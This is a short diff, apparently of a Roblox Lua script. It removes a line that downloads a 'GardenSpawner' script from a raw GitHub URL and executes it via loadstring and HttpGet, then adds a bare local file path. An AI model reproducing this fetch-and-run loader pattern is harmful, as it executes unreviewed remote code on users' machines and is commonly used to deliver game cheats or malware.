@@ -1,2 +1,1 @@
-local Spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/ataturk123/GardenSpawner/refs/heads/main/Spawner.lua"))()
-Spawner.Load()
+file:///C:/Users/mynrd/Downloads/88576ec65d2ea5935c8bfd0f57ddb547.txt
